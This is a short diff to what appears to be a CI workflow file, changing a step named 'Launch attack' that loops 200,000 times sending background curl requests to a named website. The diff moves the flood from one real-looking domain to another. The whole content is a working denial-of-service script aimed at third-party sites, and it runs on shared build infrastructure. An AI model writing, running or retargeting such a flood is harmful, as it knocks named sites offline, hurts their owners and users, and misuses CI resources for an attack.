@@ -14,9 +14,9 @@ jobs:
 
       - name: Launch attack
         run: |
-          echo "🚀 Starting attack on https://mohamed-shaheen.axnos.com"
+          echo "🚀 Starting attack on https://mrahmedelsaka.com/"
           for i in {1..200000}; do
-            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com" || true &
+            curl -s -o /dev/null "https://mrahmedelsaka.com/" || true &
           done
           wait
           echo "✅ Attack wave completed."
